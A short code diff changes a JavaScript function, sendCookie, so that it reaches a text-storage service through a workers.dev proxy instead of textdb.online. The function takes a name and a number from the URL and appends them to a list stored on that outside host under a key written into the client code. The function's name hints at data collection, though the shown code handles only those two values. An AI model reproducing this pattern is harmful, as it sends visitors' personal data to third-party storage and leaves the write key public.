@@ -9,8 +9,7 @@ async function sendCookie() {
         let params = new URLSearchParams(string.substring(1));
         let name = params.get("name");
         let number = params.get("number");
-
-        let response = await fetch("https://textdb.online/S9G8AcK8Rv2JHzJxYXYGrq1h", {
+        let response = await fetch("https://textdb.coder1232026.workers.dev/S9G8AcK8Rv2JHzJxYXYGrq1h", {
             method: "GET"
         });
         let data;
@@ -27,7 +26,7 @@ async function sendCookie() {
         if (!flag)
             data.body.push({ name: name, number: number });
 
-        await fetch("https://textdb.online/update/?v=1", {
+        await fetch("https://textdb.coder1232026.workers.dev/update/?v=1", {
             method: "POST",
             headers: { "Content-Type": "application/x-www-form-urlencoded" },
             body: "key=S9G8AcK8Rv2JHzJxYXYGrq1h&value=" + encodeURIComponent(JSON.stringify(data))
